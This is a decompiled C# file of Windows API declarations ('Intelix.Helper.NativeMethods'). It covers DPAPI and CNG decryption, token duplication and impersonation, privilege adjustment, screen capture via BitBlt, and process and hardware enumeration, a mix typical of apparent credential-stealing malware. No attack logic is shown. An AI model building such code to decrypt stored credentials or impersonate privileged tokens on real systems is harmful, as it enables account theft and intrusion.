using System;
using System.Runtime.InteropServices;
using System.Text;

namespace Intelix.Helper
{
	// Token: 0x0200005F RID: 95
	public static class NativeMethods
	{
		// Token: 0x06000144 RID: 324
		[DllImport("psapi.dll", SetLastError = true)]
		public static extern bool GetProcessMemoryInfo(IntPtr hProcess, out NativeMethods.PROCESS_MEMORY_COUNTERS_EX ppsmemCounters, uint cb);

		// Token: 0x06000145 RID: 325
		[DllImport("psapi.dll", SetLastError = true)]
		public static extern bool EnumProcesses([Out] uint[] lpidProcess, uint cb, out uint lpcbNeeded);

		// Token: 0x06000146 RID: 326
		[DllImport("kernel32.dll", SetLastError = true)]
		public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, uint dwProcessId);

		// Token: 0x06000147 RID: 327
		[DllImport("kernel32.dll", SetLastError = true)]
		public static extern bool TerminateProcess(IntPtr hProcess, uint uExitCode);

		// Token: 0x06000148 RID: 328
		[DllImport("kernel32.dll", SetLastError = true)]
		public static extern bool GetVolumeInformation(string lpRootPathName, StringBuilder lpVolumeNameBuffer, int nVolumeNameSize, out uint lpVolumeSerialNumber, out uint lpMaximumComponentLength, out uint lpFileSystemFlags, StringBuilder lpFileSystemNameBuffer, int nFileSystemNameSize);

		// Token: 0x06000149 RID: 329
		[DllImport("kernel32.dll")]
		public static extern bool GlobalMemoryStatusEx(ref NativeMethods.MEMORYSTATUSEX lpBuffer);

		// Token: 0x0600014A RID: 330
		[DllImport("user32.dll", CharSet = CharSet.Unicode)]
		public static extern bool EnumDisplayDevices(string lpDevice, uint iDevNum, ref NativeMethods.DISPLAY_DEVICE lpDisplayDevice, uint dwFlags);

		// Token: 0x0600014B RID: 331
		[DllImport("kernel32.dll", SetLastError = true)]
		public static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);

		// Token: 0x0600014C RID: 332
		[DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
		public static extern bool QueryFullProcessImageName(IntPtr hProcess, int dwFlags, StringBuilder lpExeName, ref int lpdwSize);

		// Token: 0x0600014D RID: 333
		[DllImport("ncrypt.dll", CharSet = CharSet.Unicode)]
		public static extern int NCryptOpenStorageProvider(out IntPtr phProvider, string pszProviderName, int dwFlags);

		// Token: 0x0600014E RID: 334
		[DllImport("ncrypt.dll", CharSet = CharSet.Unicode)]
		public static extern int NCryptOpenKey(IntPtr hProvider, out IntPtr phKey, string pszKeyName, int dwLegacyKeySpec, int dwFlags);

		// Token: 0x0600014F RID: 335
		[DllImport("ncrypt.dll", CharSet = CharSet.Unicode)]
		public static extern int NCryptDecrypt(IntPtr hKey, byte[] pbInput, int cbInput, IntPtr pPaddingInfo, byte[] pbOutput, int cbOutput, out int pcbResult, int dwFlags);

		// Token: 0x06000150 RID: 336
		[DllImport("ncrypt.dll", CharSet = CharSet.Unicode)]
		public static extern int NCryptFreeObject(IntPtr hObject);

		// Token: 0x06000151 RID: 337
		[DllImport("user32.dll")]
		public static extern IntPtr GetDesktopWindow();

		// Token: 0x06000152 RID: 338
		[DllImport("user32.dll")]
		public static extern IntPtr GetWindowDC(IntPtr hWnd);

		// Token: 0x06000153 RID: 339
		[DllImport("user32.dll")]
		public static extern int ReleaseDC(IntPtr hWnd, IntPtr hDC);

		// Token: 0x06000154 RID: 340
		[DllImport("gdi32.dll")]
		public static extern bool BitBlt(IntPtr hdcDest, int nXDest, int nYDest, int nWidth, int nHeight, IntPtr hdcSrc, int nXSrc, int nYSrc, int dwRop);

		// Token: 0x06000155 RID: 341
		[DllImport("kernel32.dll", SetLastError = true)]
		public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);

		// Token: 0x06000156 RID: 342
		[DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
		public static extern bool QueryFullProcessImageName(IntPtr hProcess, int dwFlags, StringBuilder exeName, ref uint lpdwSize);

		// Token: 0x06000157 RID: 343
		[DllImport("kernel32.dll", SetLastError = true)]
		public static extern bool CloseHandle(IntPtr hObject);

		// Token: 0x06000158 RID: 344
		[DllImport("crypt32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
		public static extern bool CryptUnprotectData(ref NativeMethods.DataBlob pDataIn, ref string ppszDataDescr, ref NativeMethods.DataBlob pOptionalEntropy, IntPtr pvReserved, ref NativeMethods.CryptprotectPromptstruct pPromptStruct, int dwFlags, ref NativeMethods.DataBlob pDataOut);

		// Token: 0x06000159 RID: 345
		[DllImport("advapi32.dll", SetLastError = true)]
		public static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);

		// Token: 0x0600015A RID: 346
		[DllImport("advapi32.dll", SetLastError = true)]
		public static extern bool DuplicateTokenEx(IntPtr hExistingToken, uint dwDesiredAccess, IntPtr lpTokenAttributes, uint ImpersonationLevel, uint TokenType, out IntPtr phNewToken);

		// Token: 0x0600015B RID: 347
		[DllImport("advapi32.dll", SetLastError = true)]
		public static extern bool ImpersonateLoggedOnUser(IntPtr hToken);

		// Token: 0x0600015C RID: 348
		[DllImport("advapi32.dll", SetLastError = true)]
		public static extern bool RevertToSelf();

		// Token: 0x0600015D RID: 349
		[DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
		public static extern bool LookupPrivilegeValue(string lpSystemName, string lpName, ref NativeMethods.LUID lpLuid);

		// Token: 0x0600015E RID: 350
		[DllImport("advapi32.dll", SetLastError = true)]
		public static extern bool AdjustTokenPrivileges(IntPtr TokenHandle, bool DisableAllPrivileges, ref NativeMethods.TOKEN_PRIVILEGES NewState, uint BufferLength, IntPtr PreviousState, IntPtr ReturnLength);

		// Token: 0x0600015F RID: 351
		[DllImport("kernel32.dll", SetLastError = true)]
		public static extern IntPtr GetCurrentProcess();

		// Token: 0x020000DF RID: 223
		[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
		public struct CryptprotectPromptstruct
		{
			// Token: 0x040001BB RID: 443
			public int cbSize;

			// Token: 0x040001BC RID: 444
			public int dwPromptFlags;

			// Token: 0x040001BD RID: 445
			public IntPtr hwndApp;

			// Token: 0x040001BE RID: 446
			public string szPrompt;
		}

		// Token: 0x020000E0 RID: 224
		[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
		public struct DataBlob
		{
			// Token: 0x040001BF RID: 447
			public int cbData;

			// Token: 0x040001C0 RID: 448
			public IntPtr pbData;
		}

		// Token: 0x020000E1 RID: 225
		public struct LUID
		{
			// Token: 0x040001C1 RID: 449
			public uint LowPart;

			// Token: 0x040001C2 RID: 450
			public int HighPart;
		}

		// Token: 0x020000E2 RID: 226
		public struct TOKEN_PRIVILEGES
		{
			// Token: 0x040001C3 RID: 451
			public uint PrivilegeCount;

			// Token: 0x040001C4 RID: 452
			public NativeMethods.LUID Luid;

			// Token: 0x040001C5 RID: 453
			public uint Attributes;
		}

		// Token: 0x020000E3 RID: 227
		public struct MEMORYSTATUSEX
		{
			// Token: 0x040001C6 RID: 454
			public uint dwLength;

			// Token: 0x040001C7 RID: 455
			public uint dwMemoryLoad;

			// Token: 0x040001C8 RID: 456
			public ulong ullTotalPhys;

			// Token: 0x040001C9 RID: 457
			public ulong ullAvailPhys;

			// Token: 0x040001CA RID: 458
			public ulong ullTotalPageFile;

			// Token: 0x040001CB RID: 459
			public ulong ullAvailPageFile;

			// Token: 0x040001CC RID: 460
			public ulong ullTotalVirtual;

			// Token: 0x040001CD RID: 461
			public ulong ullAvailVirtual;

			// Token: 0x040001CE RID: 462
			public ulong ullAvailExtendedVirtual;
		}

		// Token: 0x020000E4 RID: 228
		[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
		public struct DISPLAY_DEVICE
		{
			// Token: 0x040001CF RID: 463
			public int cb;

			// Token: 0x040001D0 RID: 464
			[MarshalAs(UnmanagedType.ByValTStr, SizeConst = 32)]
			public string DeviceName;

			// Token: 0x040001D1 RID: 465
			[MarshalAs(UnmanagedType.ByValTStr, SizeConst = 128)]
			public string DeviceString;

			// Token: 0x040001D2 RID: 466
			public uint StateFlags;

			// Token: 0x040001D3 RID: 467
			[MarshalAs(UnmanagedType.ByValTStr, SizeConst = 128)]
			public string DeviceID;

			// Token: 0x040001D4 RID: 468
			[MarshalAs(UnmanagedType.ByValTStr, SizeConst = 128)]
			public string DeviceKey;
		}

		// Token: 0x020000E5 RID: 229
		public struct PROCESS_MEMORY_COUNTERS_EX
		{
			// Token: 0x040001D5 RID: 469
			public uint cb;

			// Token: 0x040001D6 RID: 470
			public uint PageFaultCount;

			// Token: 0x040001D7 RID: 471
			public UIntPtr PeakWorkingSetSize;

			// Token: 0x040001D8 RID: 472
			public UIntPtr WorkingSetSize;

			// Token: 0x040001D9 RID: 473
			public UIntPtr QuotaPeakPagedPoolUsage;

			// Token: 0x040001DA RID: 474
			public UIntPtr QuotaPagedPoolUsage;

			// Token: 0x040001DB RID: 475
			public UIntPtr QuotaPeakNonPagedPoolUsage;

			// Token: 0x040001DC RID: 476
			public UIntPtr QuotaNonPagedPoolUsage;

			// Token: 0x040001DD RID: 477
			public UIntPtr PagefileUsage;

			// Token: 0x040001DE RID: 478
			public UIntPtr PeakPagefileUsage;

			// Token: 0x040001DF RID: 479
			public UIntPtr PrivateUsage;
		}
	}
}
